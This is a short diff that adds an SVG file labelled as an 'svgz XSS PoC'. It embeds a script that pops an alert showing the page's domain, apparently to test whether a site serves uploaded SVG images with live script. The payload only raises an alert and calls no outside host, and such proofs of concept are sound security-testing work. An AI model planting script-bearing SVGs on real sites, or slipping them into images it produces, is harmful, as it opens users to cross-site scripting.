@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="300" height="80">
+  <script type="text/javascript">
+    alert('F2 svgz XSS on ' + document.domain);
+  </script>
+  <text x="10" y="40">anon-github svgz XSS PoC</text>
+</svg>
